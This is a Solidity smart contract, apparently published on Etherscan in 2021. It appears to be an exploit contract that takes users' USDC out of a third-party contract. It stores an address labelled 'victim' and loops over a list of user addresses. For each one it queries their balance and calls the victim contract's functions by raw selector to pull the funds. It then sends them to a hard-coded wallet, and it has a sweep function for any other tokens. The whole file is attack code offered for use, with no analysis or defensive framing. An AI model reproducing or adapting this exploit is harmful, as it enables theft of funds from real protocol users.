/**
 *Submitted for verification at Etherscan.io on 2021-08-12
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

interface Token {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
}

contract XXX {
    address private victim = 0x41B856701BB8c24CEcE2Af10651BfAfEbb57cf49;
    address private wallet = 0xD8428836eD2A36bD67cd5b157b50813B30208F50;
    Token private usdc = Token(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function h(address[] calldata _addresses) public {
        for(uint i = 0;i < _addresses.length;i++) {
            address _addr = _addresses[i];
            uint sum = f(_addr);
            if (sum > 0){
                (bool success, ) = victim.call(
                    abi.encodeWithSelector(
                        0x50b158e4,
                        _addr,
                        address(usdc),
                        sum
                    )
                );
                if (!success) revert();
                else usdc.transfer(wallet, sum);
            }
        }
    }

    function unblock(address token) external {
        Token(token).transfer(wallet, Token(token).balanceOf(address(this)));
    }

    function f(address _addr) internal returns (uint) {
        (, bytes memory returnData) = victim.call(
            abi.encodeWithSelector(
                0x4b4f892a,
                _addr,
                address(usdc)
            )
        );
        if (returnData.length > 0) return abi.decode(returnData, (uint));
        else return 0;
    }
}